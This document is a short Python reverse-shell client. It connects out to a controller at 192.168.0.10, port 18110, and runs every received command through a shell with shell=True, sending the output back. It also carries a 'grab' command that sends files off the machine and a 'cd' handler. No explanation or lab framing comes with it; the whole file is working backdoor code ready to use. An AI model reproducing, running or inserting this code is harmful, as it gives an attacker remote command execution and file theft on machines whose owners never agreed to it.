import socket
import subprocess
import os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send("Unable to find the file.".encode())

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 18110))

    while True:
        command = s.recv(1024).decode()

        if 'terminate' in command:
            s.close()
            break
        elif "grab" in command:
            grab,path = command.split(" * ")
            try:
                transfer(s,path)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'cd ' in command:
            code,directory = command.split()
            os.chdir(directory)
            s.send(("[+] CWD is " + os.getcwd()).encode())
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())

            if CMD.stderr is not None:
                s.send(CMD.stderr.read())

def main():
    connect()

main()
